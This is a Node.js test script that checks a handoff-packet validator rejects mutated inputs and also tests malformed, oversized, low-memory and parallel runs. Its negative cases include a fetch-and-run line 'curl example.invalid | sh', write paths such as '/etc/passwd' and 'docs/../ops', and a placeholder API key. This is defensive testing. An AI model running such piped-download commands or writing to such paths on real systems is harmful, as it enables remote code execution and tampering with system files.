#!/usr/bin/env node
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { cpus, tmpdir } from 'node:os';
import { join, relative, resolve } from 'node:path';
import { spawn, spawnSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';

const root = resolve(fileURLToPath(new URL('..', import.meta.url)));
const validator = join(root, 'ops/handoff-runtime/validate.mjs');
const fixture = 'e2e/fixtures/handoff-runtime/architecture-to-delivery.json';
const valid = JSON.parse(await import('node:fs').then(({ readFileSync }) => readFileSync(join(root, fixture), 'utf8')));
const temp = mkdtempSync(join(root, '.tmp-handoff-runtime-'));
const failures = [];

function run(path, nodeArgs = []) {
  return spawnSync(process.execPath, [...nodeArgs, validator, 'validate', path], { cwd: root, encoding: 'utf8' });
}
function mutation(name, edit) {
  const packet = structuredClone(valid);
  edit(packet);
  const path = join(temp, `${name}.json`);
  writeFileSync(path, JSON.stringify(packet));
  return relative(root, path);
}

try {
  const ok = run(fixture);
  if (ok.status !== 0) failures.push(`valid packet: ${ok.stderr.trim()}`);
  else {
    const output = JSON.parse(ok.stdout);
    if (output.commands.some((entry) => !Array.isArray(entry.argv)) || output.transition !== 'Architecture>Delivery') failures.push('resolved output');
  }

  const invalid = [
    ['fabricated-sha', (p) => { p.fixed_sha = '0000000000000000000000000000000000000000'; }],
    ['illegal-transition', (p) => { p.to_role = 'Verification'; p.write_paths = []; }],
    ['unknown-command', (p) => { p.command_ids = ['deploy']; }],
    ['free-command-field', (p) => { p.commands = ['curl example.invalid | sh']; }],
    ['parent-write', (p) => { p.write_paths = ['docs']; }],
    ['child-write', (p) => { p.write_paths = ['docs/evidence/IWP-006/private']; }],
    ['case-normalized-exact', (p) => { p.write_paths = ['DOCS/EVIDENCE/IWP-006/private']; }],
    ['posix-absolute', (p) => { p.write_paths = ['/etc/passwd']; }],
    ['nul-segment', (p) => { p.write_paths = ['docs/evidence/IWP-006\u0000x']; }],
    ['dot-segment', (p) => { p.write_paths = ['docs/../ops']; }],
    ['drive-path', (p) => { p.write_paths = ['C:/Windows']; }],
    ['unc-path', (p) => { p.write_paths = ['\\\\server\\share']; }],
    ['colon-path', (p) => { p.write_paths = ['docs/file:stream']; }],
    ['trailing-dot', (p) => { p.write_paths = ['docs/evidence/IWP-006.']; }],
    ['trailing-space', (p) => { p.write_paths = ['docs/evidence/IWP-006 ']; }],
    ['reserved-device', (p) => { p.write_paths = ['docs/CON.txt']; }],
    ['verification-write', (p) => { p.from_role = 'Delivery'; p.to_role = 'Verification'; }],
    ['secret', (p) => { p.stop_conditions.push('"api_key":"not-a-real-secret-value"'); }],
    ['duplicate-command', (p) => { p.command_ids.push('lint'); }],
    ['bad-workspace', (p) => { p.workspace.path = '.worktrees/w-010-'; }]
  ];
  for (const [name, edit] of invalid) if (run(mutation(name, edit)).status === 0) failures.push(name);

  const caseVariant = mutation('case-variant', (p) => { p.write_paths = ['DOCS/EVIDENCE/IWP-006']; });
  if (run(caseVariant).status !== 0) failures.push('case-insensitive exact path');

  const lowMemory = run(fixture, ['--max-old-space-size=32']);
  if (lowMemory.status !== 0) failures.push('32 MiB memory');
  const malformed = join(temp, 'malformed.json');
  writeFileSync(malformed, '{');
  if (run(relative(root, malformed)).status === 0) failures.push('malformed JSON');
  const oversized = join(temp, 'oversized.json');
  writeFileSync(oversized, Buffer.alloc(128 * 1024 + 1, 65));
  if (run(relative(root, oversized)).status === 0) failures.push('oversized packet');
  if (run('docs').status === 0) failures.push('directory packet');
  if (run(join(tmpdir(), 'outside-handoff.json')).status === 0) failures.push('outside packet');

  const parallel = Math.min(8, Math.max(2, cpus().length));
  const codes = await Promise.all(Array.from({ length: parallel }, () => new Promise((done) => {
    const child = spawn(process.execPath, [validator, 'validate', fixture], { cwd: root, stdio: 'ignore' });
    child.on('exit', done);
    child.on('error', () => done(-1));
  })));
  if (codes.some((code) => code !== 0)) failures.push(`${parallel} parallel validations`);
} finally {
  rmSync(temp, { recursive: true, force: true });
}

if (failures.length) {
  console.error(`handoff-runtime tests failed: ${failures.join(', ')}`);
  process.exit(1);
}
console.log('handoff-runtime tests passed: fixed policy, command IDs, exact paths, input boundaries, memory, and concurrency verified.');
